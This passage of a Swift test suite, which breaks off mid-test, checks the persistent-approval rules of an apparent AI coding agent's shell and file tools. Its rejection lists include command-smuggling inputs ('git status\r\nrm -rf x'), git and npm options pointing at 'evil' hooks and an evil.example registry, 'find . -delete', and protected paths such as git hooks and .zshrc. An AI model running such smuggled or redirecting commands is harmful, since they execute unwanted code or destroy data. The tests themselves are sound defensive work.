    private final class Probe: ToolExecutor, @unchecked Sendable {
        private let lock = NSLock()
        private var count = 0
        var executions: Int { lock.withLock { count } }
        func execute(name: String, input: [String: Any]) async throws -> String {
            lock.withLock { count += 1 }
            return "executed"
        }
    }

    @Test("a hook ask cannot offer or persist a rule even with an attached writable rule store")
    func hookAskCannotPersistInTheRealAttachedRuleStore() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let rules = makeStore(file)
        let c = controller(rules: rules, roots: roots)
        let target = try shell("git status")
        let normalOffer = try #require(await c.persistentAllowOffer(capability: "shell_execute", input: target))
        #expect(normalOffer.isAvailable)
        let positive = try #require(await c.persistAllowRule(capability: "shell_execute", input: shell("git log")))
        #expect(makeStore(file).allRules().map(\.id) == [positive.id])
        let recorder = Recorder()
        let probe = Probe()
        let executor = ComposerPolicyEnforcedToolExecutor(base: probe, controller: c,
            approvalGate: ApprovalGate(policy: .autoApprove,
                delegate: PersistingDelegate(recorder: recorder, persist: true)),
            hookHandler: { invocation in ComposerHookResult(verdict: .ask,
                invocationIdentityDigest: invocation.identityDigest, reason: "confirm this call") })
        #expect(try await executor.execute(callID: "hook-ask-attached", name: "shell_execute", input: target) == "executed")
        let request = try #require(recorder.seenRequests.first)
        #expect(request.isHookAsk && request.persistentAllowOffer == nil)
        #expect(probe.executions == 1)
        // The delegate explicitly returned persistAllow=true; it still must not write.
        #expect(makeStore(file).allRules().map(\.id) == [positive.id])
    }

    @Test("a rule hit skips the prompt but still mints a call-bound receipt naming the rule")
    func ruleHitMintsCallReceipt() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let recorder = Recorder()
        let probe = Probe()
        let c = controller(rules: makeStore(file), roots: roots)
        let executor = ComposerPolicyEnforcedToolExecutor(
            base: probe, controller: c,
            approvalGate: ApprovalGate(policy: .autoApprove, delegate: PersistingDelegate(recorder: recorder, persist: true)),
            onApprovalReceipt: { recorder.record($0) })

        // First call prompts; the prompt carries an available offer and the user chose persistence.
        // （只读命令如 git status 现在免问，所以用 swift test。）
        #expect(try await executor.execute(callID: "call-1", name: "shell_execute", input: shell("swift test")) == "executed")
        #expect(recorder.seenRequests.count == 1)
        #expect(recorder.seenRequests.first?.persistentAllowOffer?.isAvailable == true)
        #expect(recorder.seenRequests.first?.persistentAllowOffer?.summary == "swift test")
        let rule = try #require(makeStore(file).allRules().first)
        #expect(recorder.seenReceipts.first?.persistentRuleID == nil)

        // Second call hits the rule: no new prompt, one more execution, a fresh receipt.
        #expect(try await executor.execute(callID: "call-2", name: "shell_execute", input: shell("swift test --verbose")) == "executed")
        #expect(recorder.seenRequests.count == 1)
        #expect(probe.executions == 2)
        let receipt = try #require(recorder.seenReceipts.last)
        #expect(recorder.seenReceipts.count == 2)
        #expect(receipt.callID == "call-2")
        #expect(receipt.persistentRuleID == rule.id)
        #expect(receipt.inputDigest == (try shell("swift test --verbose")).digest)
        #expect(receipt.identityDigest != recorder.seenReceipts.first?.identityDigest)

        // A different command in the same project still prompts.
        _ = try await executor.execute(callID: "call-3", name: "shell_execute", input: shell("npm test"))
        #expect(recorder.seenRequests.count == 2)
    }

    @Test("approving without the persistent choice, or an ineligible command, saves nothing")
    func plainApprovalSavesNothing() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let probe = Probe()

        let once = Recorder()
        let plain = ComposerPolicyEnforcedToolExecutor(
            base: probe, controller: controller(rules: makeStore(file), roots: roots),
            approvalGate: ApprovalGate(policy: .autoApprove, delegate: PersistingDelegate(recorder: once, persist: false)))
        _ = try await plain.execute(callID: "call-1", name: "shell_execute", input: shell("git status"))
        #expect(makeStore(file).allRules().isEmpty)

        // The decision flag alone cannot create a rule for an ineligible call.
        let forced = Recorder()
        let eager = ComposerPolicyEnforcedToolExecutor(
            base: probe, controller: controller(rules: makeStore(file), roots: roots),
            approvalGate: ApprovalGate(policy: .autoApprove, delegate: PersistingDelegate(recorder: forced, persist: true)))
        _ = try await eager.execute(callID: "call-2", name: "shell_execute", input: shell("git status > out.txt"))
        #expect(forced.seenRequests.first?.persistentAllowOffer?.isAvailable == false)
        #expect(makeStore(file).allRules().isEmpty)
    }

    // MARK: Pre-review must-fix items (CRLF, allowlist, file exclusions, rule file)

    private func assertNeverRemembered(
        _ commands: [String], rule stored: String = "git status"
    ) async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [dir.appendingPathComponent("project").path])
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell(stored))
        for command in commands {
            let input = try shell(command)
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: input)
            #expect(offer?.isAvailable == false, "offer for \(command.debugDescription)")
            #expect(await c.persistAllowRule(capability: "shell_execute", input: input) == nil,
                    "rule for \(command.debugDescription)")
            #expect(try await c.authorize(capability: "shell_execute", input: input) == ask,
                    "match for \(command.debugDescription)")
        }
        #expect(store.allRules().count == 1)
    }

    @Test("CR, CRLF, Unicode line separators and other control characters are never remembered")
    func lineBreaksAndControlCharactersAreNeverRemembered() async throws {
        // "\r\n" is ONE Swift Character that equals neither "\r" nor "\n".
        #expect(Array("a\r\nb").count == 3)
        try await assertNeverRemembered([
            "git status\r\nrm -rf x", "git status\u{2028}ls",
            "git\u{00A0}status", "git status\u{200B}",
            // Metacharacter followed by a combining mark is a different Character.
            "git status;\u{0301} rm -rf x", "git status \u{0301}",
        ])
    }

    @Test("only allowlisted executable + subcommand prefixes offer persistent allow")
    func onlyAllowlistedPrefixesAreOffered() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let c = controller(
            rules: makeStore(dir.appendingPathComponent("rules.json")),
            roots: [dir.appendingPathComponent("project").path])

        let offered: [(command: String, summary: String)] = [
            ("git status", "git status"), ("git status -s", "git status"), ("git diff --stat HEAD~1", "git diff"),
            ("git log --oneline -5", "git log"), ("git show --stat HEAD", "git show"),
            ("git branch", "git branch"), ("git branch -a", "git branch"),
            ("swift build", "swift build"), ("swift build -c release", "swift build"), ("swift test", "swift test"),
            ("npm test", "npm test"), ("npm run build", "npm run build"), ("npm run lint:fix", "npm run lint:fix"),
            ("yarn test", "yarn test"), ("pnpm test", "pnpm test"), ("make test", "make test"),
            ("ls", "ls"), ("ls -la src", "ls"), ("pwd", "pwd"),
        ]
        for (command, summary) in offered {
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: try shell(command))
            #expect(offer?.isAvailable == true, "offer for \(command)")
            #expect(offer?.summary == summary, "summary for \(command)")
        }

        // 对齐 Claude Code：任意命令都可以按"首词 + 子命令"前缀记住。
        let nowOffered: [(command: String, summary: String)] = [
            ("git push", "git push"), ("git checkout main", "git checkout"), ("npm install", "npm install"),
            ("make build", "make build"), ("mkdir foo", "mkdir"), ("cat README.md", "cat"),
            ("echo hi", "echo"), ("xcodebuild -list", "xcodebuild"), ("cargo build --release", "cargo build"),
            ("pnpm run build", "pnpm run build"), ("uv run pytest -q", "uv run pytest"),
            ("python3 build.py", "python3 build.py"), ("npm run test && cargo build", "npm run test、cargo build"),
        ]
        for (command, summary) in nowOffered {
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: try shell(command))
            #expect(offer?.isAvailable == true, "offer for \(command)")
            #expect(offer?.summary == summary, "summary for \(command)")
        }

        // 危险命令、需要子命令的工具缺子命令、git config 等仍然不提供。
        let unavailable = [
            "rm x", "sudo ls", "git config user.name x", "git -c core.pager=evil status", "npm run",
            "bash script.sh", "python3 -c print(1)", "find . -delete", "swift --version",
        ]
        for command in unavailable {
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: try shell(command))
            #expect(offer?.isAvailable == false, "offer for \(command)")
        }
    }

    @Test("a compound command is covered only when every sub-command has a rule")
    func compoundCommandNeedsEverySubcommandRule() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [dir.appendingPathComponent("project").path])
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("ls src && npm run test | grep ok"))
        let patterns = Set(store.allRules().map(\.pattern))
        #expect(patterns == ["ls", "npm run test", "grep"])
        #expect(try await c.authorize(capability: "shell_execute", input: shell("ls lib && npm run test")) == .execute)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("npm run test && npm run build")) == ask)
    }

    @Test("allowlisted prefixes with dangerous arguments are not remembered and never match")
    func dangerousArgumentsAreNotRemembered() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let c = controller(
            rules: makeStore(dir.appendingPathComponent("rules.json")),
            roots: [dir.appendingPathComponent("project").path])
        for command in ["git status", "git diff --stat", "git branch", "ls", "make test", "npm run build", "pwd"] {
            #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell(command)) != nil)
        }
        #expect(try await c.authorize(capability: "shell_execute", input: shell("make test")) == .execute)
        for command in [
            "git status --upload-pack=evil", "git status -c core.fsmonitor=evil",
            "git diff --output=out.txt", "git diff --ext-diff",
            "make test -f evil.mk", "make test CC=evil", "npm run",
            "ls /etc", "ls ../secret", "ls ~",
            "git branch -D x", "git branch newbranch", "git branch -m old new", "pwd /etc"
        ] {
            let input = try shell(command)
            #expect(await c.persistentAllowOffer(capability: "shell_execute", input: input)?.isAvailable == false)
            #expect(await c.persistAllowRule(capability: "shell_execute", input: input) == nil)
            // pwd 忽略操作数，属只读命令，手动档免问（PM-05）；它只是不能被“记住”。其余命令仍要问。
            let expected: ComposerAuthorizationDecision = command == "pwd /etc" ? .execute : ask
            #expect(try await c.authorize(capability: "shell_execute", input: input) == expected, "authorize \(command)")
        }
    }

    @Test("git internals, tool config, shell startup files and LaunchAgents are never remembered")
    func excludedFileLocationsAreNotRemembered() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let root = dir.appendingPathComponent("project", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [root.path])
        #expect(await c.persistAllowRule(capability: "file_write", input: try filePath(root.appendingPathComponent("src/ok.txt").path)) != nil)

        let excluded = [
            ".git/hooks/pre-commit", ".git/config", "sub/.git/hooks/post-merge", ".GIT/hooks/x",
            ".claude/settings.json", ".claude/hooks/run.sh", ".mcp.json", "pkg/.mcp.json",
            ".vscode/tasks.json", ".idea/workspace.xml",
            ".zshrc", ".bashrc", ".bash_profile", ".profile", ".zprofile",
            "Library/LaunchAgents/com.example.plist", "Library/LaunchDaemons/com.example.plist",
        ]
        for name in excluded {
            for capability in ["file_write", "file_edit"] {
                let input = try filePath(root.appendingPathComponent(name).path)
                #expect(await c.persistentAllowOffer(capability: capability, input: input)?.isAvailable == false,
                        "offer \(capability) \(name)")
                #expect(await c.persistAllowRule(capability: capability, input: input) == nil, "rule \(name)")
            }
            // The directory rule stored above must not cover these either.
            #expect(try await c.authorize(capability: "file_write", input: filePath(root.appendingPathComponent(name).path)) == ask,
                    "match \(name)")
        }
        #expect(try await c.authorize(capability: "file_write", input: filePath(root.appendingPathComponent("src/other.txt").path)) == .execute)
    }

    @Test("a project that itself lives under .claude or .git still gets file rules; only paths below the root are excluded")
    func projectUnderDotDirectoryStillGetsFileRules() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let root = dir.appendingPathComponent(".claude/worktrees/abc", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [root.path])

        let ok = try filePath(root.appendingPathComponent("src/a.swift").path)
        #expect(await c.persistentAllowOffer(capability: "file_write", input: ok)?.isAvailable == true)
        #expect(await c.persistAllowRule(capability: "file_write", input: ok) != nil)
        #expect(try await c.authorize(capability: "file_write", input: filePath(root.appendingPathComponent("src/b.swift").path)) == .execute)

        let nestedTools = try filePath(root.appendingPathComponent("Sources/tools/a.swift").path)
        #expect(await c.persistentAllowOffer(capability: "file_write", input: nestedTools)?.isAvailable == true)
        #expect(try await c.authorize(capability: "file_write", input: nestedTools) == .execute)

        for name in [".git/hooks/x", ".claude/settings.json", "sub/.git/config", ".idea/x.xml", ".vscode/tasks.json", ".mcp.json", ".zshrc"] {
            let input = try filePath(root.appendingPathComponent(name).path)
            #expect(await c.persistentAllowOffer(capability: "file_write", input: input)?.isAvailable == false, "offer \(name)")
            #expect(await c.persistAllowRule(capability: "file_edit", input: input) == nil, "rule \(name)")
            #expect(try await c.authorize(capability: "file_write", input: input) == ask, "match \(name)")
        }
        // Absolute-path exclusion still applies below the root.
        let agents = try filePath(root.appendingPathComponent("Library/LaunchAgents/x.plist").path)
        #expect(await c.persistentAllowOffer(capability: "file_write", input: agents)?.isAvailable == false)
    }

    @Test("a HOME-level shell startup file is excluded by absolute path")
    func homeLevelStartupFileIsExcluded() {
        #expect(PersistentApprovalRuleMatcher.isExcludedLocation(
            "/Users/x/.zshrc", relativeTo: ["/Users/x/proj"], home: "/Users/x"))
        #expect(PersistentApprovalRuleMatcher.isExcludedLocation(
            "/Users/x/Library/LaunchAgents/a.plist", relativeTo: ["/Users/x/proj"], home: "/Users/x"))
        #expect(!PersistentApprovalRuleMatcher.isExcludedLocation(
            "/Users/x/proj/.claude/worktrees/abc/src/a.swift",
            relativeTo: ["/Users/x/proj/.claude/worktrees/abc"], home: "/Users/x"))
        #expect(PersistentApprovalRuleMatcher.isExcludedLocation(
            "/Users/x/proj/.claude/worktrees/abc/.git/hooks/x",
            relativeTo: ["/Users/x/proj/.claude/worktrees/abc"], home: "/Users/x"))
    }

    // MARK: Plan A: build / script files are never remembered

    @Test("build manifests, scripts and CI files are not offered and a stored directory rule does not cover them")
    func buildAndScriptFilesAreNotRemembered() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let root = dir.appendingPathComponent("project", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [root.path])
        // A directory rule exists, stored from an ordinary source file.
        #expect(await c.persistAllowRule(capability: "file_write", input: try filePath(root.appendingPathComponent("src/seed.swift").path)) != nil)

        let excluded = [
            // package manifests and locks
            "package.json", "PACKAGE.JSON", "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
            ".yarnrc", ".yarnrc.yml", ".pnpmfile.cjs", "Package.swift", "Package.resolved",
            "packages/app/package.json",
            // make-like and other language build files
            "Makefile", "makefile", "GNUmakefile", "rules.mk", "sub/common.MK", "justfile", "Rakefile", "Gemfile",
            "Package@swift-5.9.swift", "package@swift-6.0.swift", "Plugins/Gen/plugin.swift",
            "pyproject.toml", "setup.py", "setup.cfg", "tox.ini", "noxfile.py", "CMakeLists.txt", "Dockerfile",
            "docker-compose.yml", "docker-compose.override.yml", "build.gradle", "build.gradle.kts", "pom.xml",
            "Config/Debug.xcconfig", "App.xcodeproj/project.pbxproj", "Lib.podspec",
            // CI files
            ".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "Jenkinsfile",
            // directories
            ".github/workflows/ci.yml", ".husky/pre-commit", ".gitlab/ci.yml", ".circleci/config.yml",
            ".config/tool.toml", "scripts/build.sh", "Scripts/Build.sh", "bin/run", "tools/gen.py",
            "sub/.github/workflows/x.yml",
        ]
        for name in excluded {
            for capability in ["file_write", "file_edit"] {
                let input = try filePath(root.appendingPathComponent(name).path)
                let offer = await c.persistentAllowOffer(capability: capability, input: input)
                #expect(offer?.isAvailable == false, "offer \(capability) \(name)")
                #expect(offer?.unavailableReason == PersistentApprovalRuleMatcher.buildConfigUnavailableReason,
                        "reason \(capability) \(name)")
                #expect(await c.persistAllowRule(capability: capability, input: input) == nil, "rule \(name)")
            }
            #expect(try await c.authorize(capability: "file_write", input: filePath(root.appendingPathComponent(name).path)) == ask,
                    "match \(name)")
        }

        // Ordinary source, docs and tests are still offered and still covered.
        for name in [
            "src/main.swift", "README.md", "Tests/FooTests.swift", "Sources/App/bin/helper.swift",
            "src/scripts-notes.md", "docs/Makefile-guide.md", "mypackage.jsonl", "Sources/App/Plugins/helper.swift", "Sources/MyPackage@swift.txt",
        ] {
            let input = try filePath(root.appendingPathComponent(name).path)
            #expect(await c.persistentAllowOffer(capability: "file_write", input: input)?.isAvailable == true, "offer \(name)")
            #expect(try await c.authorize(capability: "file_write", input: input) == .execute, "match \(name)")
        }
    }

    @Test("build-file exclusion is judged relative to the authorization root, not the absolute path")
    func buildFileExclusionIsRelativeToRoot() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let root = dir.appendingPathComponent("scripts/proj", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [root.path])

        let ok = try filePath(root.appendingPathComponent("src/a.swift").path)
        #expect(await c.persistentAllowOffer(capability: "file_write", input: ok)?.isAvailable == true)
        #expect(await c.persistAllowRule(capability: "file_write", input: ok) != nil)
        #expect(try await c.authorize(capability: "file_write", input: filePath(root.appendingPathComponent("src/b.swift").path)) == .execute)

        for name in ["package.json", "scripts/build.sh", ".github/workflows/ci.yml"] {
            let input = try filePath(root.appendingPathComponent(name).path)
            #expect(await c.persistentAllowOffer(capability: "file_write", input: input)?.isAvailable == false, "offer \(name)")
            #expect(try await c.authorize(capability: "file_write", input: input) == ask, "match \(name)")
        }
    }

    @Test("build/test runners reject options that redirect directory, package, scope or registry, and -X pass-through flags")
    func buildToolArgumentsAreRestricted() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [dir.appendingPathComponent("project").path])

        let allowed = [
            "swift build -c release", "swift build --configuration debug", "swift test --filter FooTests",
            "swift build -j 4", "npm test", "npm test -- --watch=false", "npm run lint", "npm run build -- --mode=prod",
            "yarn test --coverage", "pnpm test --silent", "swift build --verbose",
        ]
        for command in allowed {
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: try shell(command))
            #expect(offer?.isAvailable == true, "offer for \(command)")
        }
        let rejected = [
            "swift build --package-path /x", "swift build --package-path=../x", "swift build --package-path x",
            "swift test --scratch-path /tmp/s", "swift build --scratch-path=build2", "swift build --cache-path /tmp/c",
            "swift build --build-path /tmp/b", "swift build -C /x", "swift build -C/x", "swift build --pack /x",
            "swift build -Xswiftc -foo", "swift build -Xlinker -foo", "swift build -Xcc -foo", "swift build -Xswiftc=-foo",
            "swift build /x", "swift build ~/x", "swift build ../x", "swift build a/../b", "swift build -c=/x",
            "npm run build --prefix /x", "npm run build --prefix=/x", "npm run build --prefix x", "npm test --prefix x",
            "npm test -C x", "npm test --cwd x", "yarn test --cwd x", "pnpm test --dir x", "pnpm test -C x",
            "npm test --workspace foo", "npm test -w foo", "npm test -wfoo", "npm test --workspaces", "pnpm test -w",
            "npm test --global", "npm test -g", "npm test -gv", "npm run build --registry https://evil.example",
            "npm run build --registry=https://evil.example", "npm run build --regis=x", "npm run build --script-shell=./evil",
            "npm run build -- --prefix /x", "pnpm test --glob", "yarn test /abs", "npm test ~/x",
        ]
        for command in rejected {
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: try shell(command))
            #expect(offer?.isAvailable == false, "offer for \(command)")
            #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell(command)) == nil,
                    "rule for \(command)")
        }
        #expect(store.allRules().isEmpty)

        // Rule hits apply the same restriction.
        for command in ["swift build", "npm run build", "npm test", "yarn test", "pnpm test"] {
            #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell(command)) != nil, "\(command)")
        }
        for command in ["swift build -c release", "npm run build -- --mode=prod", "npm test --watch"] {
            #expect(try await c.authorize(capability: "shell_execute", input: shell(command)) == .execute, "\(command)")
        }
        for command in [
            "swift build --package-path /x", "swift build -Xswiftc -foo", "npm run build --prefix /x",
            "npm test -C x", "yarn test --cwd x", "pnpm test --dir x", "npm test --registry=https://evil.example",
        ] {
            #expect(try await c.authorize(capability: "shell_execute", input: shell(command)) == ask, "\(command)")
        }
    }

    @Test("a session root that is the home directory, an ancestor of it, or / offers no file rule")
    func broadRootsOfferNoFileRule() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let root = dir.appendingPathComponent("project", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let target = try filePath(root.appendingPathComponent("a.txt").path)
        let file = dir.appendingPathComponent("rules.json")

        // Control: an unrelated home keeps the offer available.
        let unrelated = controller(rules: makeStore(file), roots: [root.path])
        #expect(await unrelated.persistentAllowOffer(capability: "file_write", input: target)?.isAvailable == true)
        #expect(await unrelated.persistAllowRule(capability: "file_write", input: target) != nil)
        #expect(try await unrelated.authorize(capability: "file_write", input: target) == .execute)

        // The same stored rule stops matching once the root covers HOME.
        let rootIsHome = controller(rules: makeStore(file, home: root.path), roots: [root.path])
        #expect(try await rootIsHome.authorize(capability: "file_write", input: target) == ask)

        let separate = dir.appendingPathComponent("other.json")
        for (label, home, roots) in [
            ("root is HOME", root.path, [root.path]),
            ("root is an ancestor of HOME", root.appendingPathComponent("nested/home").path, [root.path]),
            ("root is /", "/nonexistent-home-for-persistent-rule-tests", ["/"]),
        ] {
            let c = controller(rules: makeStore(separate, home: home), roots: roots)
            let offer = await c.persistentAllowOffer(capability: "file_write", input: target)
            #expect(offer?.isAvailable == false, "offer: \(label)")
            #expect(await c.persistAllowRule(capability: "file_write", input: target) == nil, "rule: \(label)")
            // Root "/" is exercised at the offer level only; the controller's own root check is not under test here.
            if roots != ["/"] {
                #expect(try await c.authorize(capability: "file_write", input: target) == ask, "match: \(label)")
            }
        }
        // 授权根覆盖家目录或 / 时，shell 规则同样不可用（效果检查器的前提：规则不能借整个家目录放行）。
        let shellOnly = controller(rules: makeStore(separate, home: root.path), roots: [root.path])
        #expect(await shellOnly.persistAllowRule(capability: "shell_execute", input: try shell("git status")) == nil)
    }

    @Test("the rule file is protected state: file tools cannot write, edit or delete it")
    func ruleFileIsProtectedFromFileTools() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let store = makeStore(file)
        let c = controller(rules: store, roots: [dir.path])
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("git status"))
        let before = try Data(contentsOf: file)

        #expect(SensitiveFilePolicy.isProtectedStatePath(file.path))
        #expect(SensitiveFilePolicy.isProtectedStatePath(file.appendingPathExtension("corrupt").path))
        #expect(SensitiveFilePolicy.contains(file.path))
        // Not recursive: a sibling project file in the same directory is ordinary.
        #expect(!SensitiveFilePolicy.isProtectedStatePath(dir.appendingPathComponent("project/a.txt").path))

        // Even a session root that contains the file gets no persistent offer for it.
        let input = try filePath(file.path)
        #expect(await c.persistentAllowOffer(capability: "file_write", input: input)?.isAvailable == false)

        let executor = BuiltinToolExecutor(allowedRoot: dir, deniedRoots: [])
        await #expect(throws: ToolExecutorError.pathViolation(file.path)) {
            _ = try await executor.execute(name: "file_write", input: ["path": file.path, "content": "{}"])
        }
        await #expect(throws: ToolExecutorError.pathViolation(file.path)) {
            _ = try await executor.execute(
                name: "file_edit", input: ["path": file.path, "old_string": "git status", "new_string": "rm"])
        }
        await #expect(throws: ToolExecutorError.pathViolation(file.path)) {
            _ = try await executor.execute(name: "file_delete", input: ["path": file.path])
        }
        #expect(try Data(contentsOf: file) == before)
    }

    @Test("rule file is written 0600 through a temp file and replaced atomically")
    func ruleFileIsWrittenPrivately() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let store = makeStore(file)
        let c = controller(rules: store, roots: [dir.appendingPathComponent("project").path])
        for command in ["git status", "swift build", "swift test"] {
            #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell(command)) != nil)
        }
        let attributes = try FileManager.default.attributesOfItem(atPath: file.path)
        #expect((attributes[.posixPermissions] as? NSNumber)?.intValue == 0o600)
        let leftovers = try FileManager.default.contentsOfDirectory(atPath: dir.path).filter { $0.hasSuffix(".tmp") }
        #expect(leftovers.isEmpty, "temp files left behind: \(leftovers)")
        #expect(makeStore(file).allRules().count == 3)
    }

    @Test("one unrecognised rule is skipped and recorded; the other rules still load")
    func unrecognisedRuleIsSkippedIndividually() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let scope = try #require(PersistentApprovalRuleMatcher.projectScope(roots: roots))
        func rule(_ id: String, kind: String, capability: String, pattern: String) -> [String: Any] {
            ["id": id, "projectKey": scope.key, "projectRoots": scope.roots, "kind": kind,
             "capability": capability, "pattern": pattern, "createdAt": "2026-10-22T00:00:00Z"]
        }
        let document: [String: Any] = [
            "schemaVersion": 1,
            "rules": [
                rule("good", kind: "shell-command-prefix", capability: "shell_execute", pattern: "git status"),
                rule("future-kind", kind: "network-host", capability: "shell_execute", pattern: "example.com"),
                rule("mismatch", kind: "shell-command-prefix", capability: "file_write", pattern: "git status"),
                ["id": "broken"] as [String: Any],
                5,
            ] as [Any],
        ]
        try JSONSerialization.data(withJSONObject: document).write(to: file)

        let store = makeStore(file)
        #expect(store.allRules().map(\.id) == ["good"])
        #expect(store.diagnostics().contains { $0.contains("4") && $0.contains("跳过") }, "\(store.diagnostics())")
        // The file was NOT set aside as corrupt; a copy of the original is kept.
        #expect(FileManager.default.fileExists(atPath: file.path))
        #expect(!FileManager.default.fileExists(atPath: file.appendingPathExtension("corrupt").path))
        #expect(FileManager.default.fileExists(atPath: file.appendingPathExtension("unrecognized").path))

        let c = controller(rules: store, roots: roots)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("git status")) == .execute)
        #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell("swift build")) != nil)
        #expect(makeStore(file).allRules().map(\.pattern).sorted() == ["git status", "swift build"])
    }

    @Test("revokeAll keeps persistent rules: they are user data, not session grants")
    func revokeAllDoesNotClearRules() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let grants = ComposerApprovalGrantStore(persistentRules: store)
        let roots = [dir.appendingPathComponent("project").path]
        let c = ComposerAuthorizationController(
            snapshot: snapshot(), facts: facts(roots: roots), grants: grants, now: { now })
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("git status"))
        await grants.revokeAll()
        #expect(store.allRules().count == 1)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("git status")) == .execute)
    }

    @Test("browser side effects never read persistent rules")
    func browserWritesDoNotReadRules() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let roots = [dir.appendingPathComponent("project").path]
        let c = controller(rules: store, roots: roots)
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("git status"))

        let click = try ComposerToolInput(["action": "click", "selector": "#buy"])
        #expect(await c.persistentAllowOffer(capability: "browser_use", input: click) == nil)
        #expect(await c.persistAllowRule(capability: "browser_use", input: click) == nil)
        let resolved = try await c.authorizeResolvingRule(capability: "browser_use", input: click)
        #expect(resolved.decision == ask)
        #expect(resolved.rule == nil)
        #expect(store.match(capability: "browser_use", input: ["action": "click"], facts: facts(roots: roots)) == nil)
    }

    @Test("an alwaysAsk gate does not stop a rule hit from executing, but a deny gate still does")
    func gatePolicyAgainstRuleHits() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let recorder = Recorder()
        let probe = Probe()

        // alwaysAsk: first call prompts and saves; second call executes WITHOUT a prompt (current semantics).
        let asking = ComposerPolicyEnforcedToolExecutor(
            base: probe, controller: controller(rules: makeStore(file), roots: roots),
            approvalGate: ApprovalGate(policy: .alwaysAsk, delegate: PersistingDelegate(recorder: recorder, persist: true)),
            onApprovalReceipt: { recorder.record($0) })
        _ = try await asking.execute(callID: "call-1", name: "shell_execute", input: shell("swift test"))
        #expect(recorder.seenRequests.count == 1)
        _ = try await asking.execute(callID: "call-2", name: "shell_execute", input: shell("swift test"))
        #expect(recorder.seenRequests.count == 1)
        #expect(probe.executions == 2)
        #expect(recorder.seenReceipts.last?.persistentRuleID != nil)

        // deny: the stored rule cannot override the user's policy.
        let denying = ComposerPolicyEnforcedToolExecutor(
            base: probe, controller: controller(rules: makeStore(file), roots: roots),
            approvalGate: ApprovalGate(policy: .deny, delegate: PersistingDelegate(recorder: recorder, persist: false)))
        await #expect(throws: (any Error).self) {
            _ = try await denying.execute(callID: "call-3", name: "shell_execute", input: shell("swift test"))
        }
        #expect(probe.executions == 2)
    }

    @Test("a rule-hit receipt carries the same risk level the prompt path would record")
    func ruleReceiptRiskMatchesPromptPath() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let recorder = Recorder()
